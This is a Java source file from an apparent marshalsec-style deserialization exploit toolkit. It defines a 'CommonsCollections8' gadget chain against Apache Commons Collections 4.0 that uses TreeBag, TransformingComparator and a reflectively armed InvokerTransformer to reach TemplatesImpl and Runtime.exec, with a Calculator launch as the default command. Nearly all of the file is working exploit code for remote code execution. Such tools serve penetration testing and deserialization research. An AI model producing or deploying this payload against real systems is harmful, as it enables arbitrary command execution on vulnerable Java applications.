package marshalsec.gadgets;

import marshalsec.UtilFactory;
import marshalsec.util.Gadgets;
import marshalsec.util.Reflections;
import org.apache.commons.collections4.bag.TreeBag;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

/*
	Gadget chain:
        org.apache.commons.collections4.bag.TreeBag.readObject
        org.apache.commons.collections4.bag.AbstractMapBag.doReadObject
        java.util.TreeMap.put
        java.util.TreeMap.compare
        org.apache.commons.collections4.comparators.TransformingComparator.compare
        org.apache.commons.collections4.functors.InvokerTransformer.transform
        java.lang.reflect.Method.invoke
        sun.reflect.DelegatingMethodAccessorImpl.invoke
        sun.reflect.NativeMethodAccessorImpl.invoke
        sun.reflect.NativeMethodAccessorImpl.invoke0
        com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer
            ... (TemplatesImpl gadget)
        java.lang.Runtime.exec
 */

/**
 * org.apache.commons:commons-collections4:4.0
 */
public interface CommonsCollections8 extends Gadget {

    @Args(minArgs = 1, args = {
        "/System/Applications/Calculator.app/Contents/MacOS/Calculator"})
    default TreeBag makeCommonsCollections8(UtilFactory uf, String[] args) throws Exception {
        Object templates = Gadgets.createTemplatesImpl(args[0]);

        // setup harmless chain
        final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);

        // define the comparator used for sorting
        TransformingComparator comp = new TransformingComparator(transformer);

        // prepare CommonsCollections object entry point
        TreeBag tree = new TreeBag(comp);
        tree.add(templates);

        // arm transformer
        Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");

        return tree;
    }
}
